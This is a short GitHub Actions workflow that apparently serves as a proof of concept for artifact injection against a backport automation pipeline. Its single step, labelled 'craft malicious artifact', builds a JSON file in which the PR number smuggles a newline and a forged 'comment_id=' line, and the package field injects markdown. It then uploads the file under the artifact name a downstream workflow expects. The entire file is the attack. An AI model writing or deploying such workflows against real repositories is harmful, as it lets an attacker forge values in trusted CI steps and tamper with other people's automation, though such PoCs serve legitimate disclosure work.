name: Backport — detect packages
on: pull_request
permissions:
  contents: read
jobs:
  fake-detect:
    runs-on: ubuntu-latest
    steps:
      - name: craft malicious artifact
        run: |
          jq -n \
            --arg pr '23
comment_id=6536628331' \
            --arg pkg '**poc-injected-package-header**
- [x] `backport-poc-1.0`' \
            '{pr_number:$pr, packages:[$pkg]}' > pr-packages.json
          cat pr-packages.json
      - uses: actions/upload-artifact@v7
        with:
          name: pr-packages-${{ github.run_id }}
          path: pr-packages.json
